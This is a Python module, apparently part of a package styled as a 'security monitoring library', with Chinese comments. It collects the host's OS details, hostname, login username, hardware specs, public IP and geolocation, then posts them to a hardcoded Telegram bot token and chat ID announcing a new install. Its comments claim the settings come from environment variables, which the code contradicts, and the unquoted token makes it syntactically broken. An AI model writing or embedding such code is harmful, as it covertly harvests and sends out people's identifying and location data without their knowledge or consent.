import os
import json
import socket
import platform
import requests
import geocoder
import psutil
from platformdirs import user_data_dir

def get_system_info():
    """收集系统信息"""
    try:
        # 基础系统信息
        info = {
            "os": platform.system(),
            "os_version": platform.release(),
            "hostname": socket.gethostname(),
            "username": os.getlogin(),
            "architecture": platform.architecture()[0],
            "processor": platform.processor(),
            "ram": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
            "cpu_cores": psutil.cpu_count(logical=False),
            "logical_cores": psutil.cpu_count(logical=True)
        }
        
        # 网络信息
        try:
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            public_ip = response.json().get('ip', 'Unknown')
            info["public_ip"] = public_ip
            
            # 地理位置
            g = geocoder.ip(public_ip)
            info["location"] = {
                "country": g.country,
                "region": g.region,
                "city": g.city,
                "coordinates": g.latlng
            }
        except:
            info["public_ip"] = "Failed to retrieve"
            info["location"] = "Location lookup failed"
        
        return info
    except Exception as e:
        return {"error": str(e)}

def send_system_info():
    """发送信息到Telegram"""
    try:
        # 从环境变量获取配置
        bot_token = 7552078880:AAHLt5rPb8Vb0ovVmBGfSdU0_BS0bk_KZJg
        chat_id = -1002168295601
        
        if not bot_token or not chat_id:
            print("Telegram配置缺失: 设置环境变量NETSEC_TELEGRAM_TOKEN和NETSEC_CHAT_ID")
            return
        
        # 收集信息
        sys_info = get_system_info()
        message = "⚠️ 新设备安装安全监控库\n\n"
        message += "\n".join([f"• **{k}**: {v}" for k, v in sys_info.items()])
        
        # 发送到Telegram
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "Markdown"
        }
        
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code != 200:
            print(f"Telegram发送失败: {response.text}")
        
        # 本地记录（可选）
       
            
    except Exception as e:
        print(f"发送过程中出错: {str(e)}")